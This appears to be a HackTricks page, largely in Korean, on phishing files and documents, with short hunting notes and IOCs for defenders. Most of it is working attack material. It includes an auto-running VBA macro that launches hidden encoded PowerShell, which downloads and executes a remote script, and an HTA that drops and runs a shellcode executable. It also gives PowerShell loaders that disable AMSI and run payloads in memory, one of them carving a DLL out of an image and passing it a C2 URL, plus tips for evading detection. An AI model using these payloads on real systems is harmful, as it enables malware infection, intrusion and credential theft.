# Phishing 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word은 파일을 열기 전에 파일 데이터 검증을 수행합니다. 데이터 검증은 OfficeOpenXML 표준에 따라 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 중에 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

보통 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경하여 파일명을 바꿔도 매크로 실행 기능을 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word에서 처리되어 매크로 실행이 가능해집니다.\
동일한 내부 구조와 메커니즘은 Microsoft Office Suite(Excel, PowerPoint 등)의 모든 소프트웨어에 적용됩니다.

다음 명령으로 일부 Office 프로그램이 실행할 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 외부 이미지 로드

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

문서에서 macros를 사용해 임의의 코드를 실행할 수 있습니다.

#### Autoload functions

더 흔할수록 AV가 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### Macros 코드 예시
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

다음으로 이동하세요: **File > Info > Inspect Document > Inspect Document**, 그러면 Document Inspector가 표시됩니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭하세요.

#### Doc Extension

작업이 끝나면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\
이렇게 해야 하는 이유는 **`.docx`** 안에는 매크로를 저장할 수 없고, 매크로 사용 가능 형식인 **`.docm`** 확장자에는 **오명(stigma)** 이 있어서(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이가 이를 완전히 차단함) **레거시 `.doc` 확장자가 가장 좋은 절충안**이기 때문입니다.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA는 **HTML과 VBScript, JScript 같은 스크립팅 언어를 결합**한 Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전 신뢰(fully trusted)"된 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 이는 일반적으로 **Internet Explorer**와 함께 **설치**되어 있어 **`mshta`가 IE에 의존**하게 됩니다. 따라서 IE가 제거된 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제

여러 가지 방법으로 **NTLM 인증을 "원격으로" 강제할 수 있습니다**, 예를 들어 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다 (심지어 HTTP MitM?). 또는 피해자에게 **파일의 주소**를 보내 그 주소가 **촉발**하는 **인증**이 **폴더를 여는 것만으로도** 발생하도록 할 수도 있습니다.

**다음 페이지들에서 이 아이디어들과 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증을 훔치는 것뿐만 아니라 **NTLM relay attacks**도 수행할 수 있다는 것을 잊지 마세요:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

효과적인 캠페인에서는 두 개의 정당한 미끼 문서(PDF/DOCX)와 악성 .lnk를 포함한 ZIP을 배포합니다. 핵심은 실제 PowerShell loader가 고유한 마커 뒤 ZIP의 원시 바이트에 저장되어 있고, .lnk가 이를 추출하여 메모리에서 완전히 실행한다는 점입니다.

일반적으로 .lnk PowerShell one-liner가 구현하는 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 현재 작업 디렉터리의 상위 폴더 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP 바이트를 읽어 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 이후의 모든 것은 임베디드 PowerShell 페이로드입니다.
3) ZIP을 %ProgramData%로 복사하고 그곳에서 압축을 풀며, 미끼 .docx를 열어 합법적으로 보이게 합니다.
4) 현재 프로세스에서 AMSI 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 스테이지의 난독화를 해제(예: 모든 # 문자 제거)하고 메모리에서 실행합니다.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## 이미지 내 스테가노그래피로 구분된 페이로드 (PowerShell stager)

최근 로더 체인은 난독화된 JavaScript/VBS를 전달하여 Base64 PowerShell stager를 디코드하고 실행합니다. 해당 stager는 이미지(종종 GIF)를 다운로드하는데, 이 이미지에는 고유한 시작/종료 마커 사이에 일반 텍스트로 숨겨진 Base64-encoded .NET DLL이 포함되어 있습니다. 스크립트는 이런 구분자(실제 사례 예: «<<sudo_png>> … <<sudo_odt>>>»)를 검색하고, 그 사이의 텍스트를 추출하여 Base64로 디코드해 바이트로 변환한 후 어셈블리를 메모리에서 로드하고 알려진 엔트리 메서드를 C2 URL과 함께 호출합니다.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell 스테고 페이로드 추출기 및 로더</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

참고
- 해당 기법은 ATT&CK T1027.003 (steganography/marker-hiding)입니다. 마커는 캠페인마다 다릅니다.
- AMSI/ETW bypass 및 string deobfuscation은 어셈블리를 로드하기 전에 일반적으로 적용됩니다.
- Hunting: 다운로드된 이미지에서 알려진 구분자(delimiters)를 스캔하고, 이미지를 접근하여 즉시 Base64 blob을 디코딩하는 PowerShell을 식별하세요.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 등장하는 초기 단계는 아카이브 안에 포함되어 전달되는 작고 심하게 난독화된 `.js` 또는 `.vbs`입니다. 이 파일의 유일한 목적은 내장된 Base64 문자열을 디코딩하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행하여 HTTPS를 통해 다음 단계를 부팅스트랩하는 것입니다.

Skeleton logic (abstract):
- 자신의 파일 내용을 읽음
- 정크 문자열 사이에 있는 Base64 blob을 찾음
- ASCII PowerShell로 디코딩
- `wscript.exe`/`cscript.exe`로 `powershell.exe`를 호출하여 실행

Hunting cues
- 압축된 JS/VBS 첨부파일이 명령줄에 `-enc`/`FromBase64String`을 포함하여 `powershell.exe`를 실행하는 경우
- `wscript.exe`가 사용자 임시 경로에서 `powershell.exe -nop -w hidden`을 실행하는 경우

## NTLM 해시 탈취용 Windows 파일

다음 페이지를 확인하세요: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## 참고자료

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
